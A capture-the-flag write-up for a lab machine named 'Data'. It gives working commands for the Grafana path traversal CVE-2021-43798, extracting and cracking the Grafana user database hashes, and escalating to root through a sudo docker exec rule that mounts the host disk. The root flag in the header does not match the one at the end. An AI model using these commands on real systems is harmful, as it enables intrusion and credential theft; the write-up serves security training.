# Data — Writeup

**Machine**: Data | **OS**: Linux | **Difficulty**: Easy | **Flags**: User `81e6...` Root `4586...`

## Chain: Grafana LFI → DB Extract → Hash Crack → SSH → Docker Priv Esc

### 1. Recon
```
22/tcp   ssh     OpenSSH 7.6p1
3000/tcp http    Grafana
```

### 2. CVE-2021-43798 (Grafana Path Traversal)
```bash
curl --path-as-is "http://10.129.234.47:3000/public/plugins/grafana/../../../../../../../../etc/passwd"
# Read Grafana DB:
curl --path-as-is "http://10.129.234.47:3000/public/plugins/grafana/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
```

### 3. Extract Hashes
```sql
sqlite3 grafana.db "SELECT login,password,salt,rands FROM user;"
-- boris:dc6becccbb57...:LCBhdtJWjl:mYl941ma8w
```

### 4. Crack Hash (hashcat mode 10900 — PBKDF2-HMAC-SHA256)
```python
import base64, binascii
hash_hex = "dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8"
salt = "LCBhdtJWjl"
hashcat_fmt = f"sha256:10000:{base64.b64encode(salt.encode()).decode()}:{base64.b64encode(binascii.unhexlify(hash_hex)).decode()}"
```
Result: `beautiful1` (from rockyou)

### 5. SSH as boris
```
User flag: /home/boris/user.txt
```

### 6. Docker Privilege Escalation
```bash
sudo -l  # (root) NOPASSWD: /snap/bin/docker exec *
sudo /snap/bin/docker exec -u root --privileged <cid> sh -c '
    mkdir -p /tmp/host
    mount /dev/sda1 /tmp/host
    cat /tmp/host/root/root.txt
    umount /tmp/host
'
```
**Root flag**: `612d850d1207db99c344488a5a13121b`
**Critical**: Docker container FS is separate from host FS. Must mount `/dev/sda1` inside the container to read host files.
